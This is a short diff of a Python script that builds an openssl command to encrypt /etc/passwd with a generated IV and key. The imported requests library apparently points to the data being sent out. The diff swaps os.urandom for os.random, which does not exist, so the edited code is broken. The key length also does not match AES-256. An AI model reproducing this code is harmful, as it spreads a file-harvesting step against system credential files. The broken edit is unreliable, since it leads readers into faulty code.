@@ -8,10 +8,8 @@ import requests
 import subprocess
 import sys
 
-raw_iv = os.urandom(16)
-raw_kx = os.urandom(16)
-iv = binascii.b2a_hex(raw_iv)
-kx = binascii.b2a_hex(raw_kx)
+iv = binascii.b2a_hex(os.random(16))
+kx = binascii.b2a_hex(os.random(16))
 
 cmd = "/usr/bin/openssl aes-256-cbc -a -salt -iv " + iv + " -K " + kx + " \
     -in /etc/passwd"
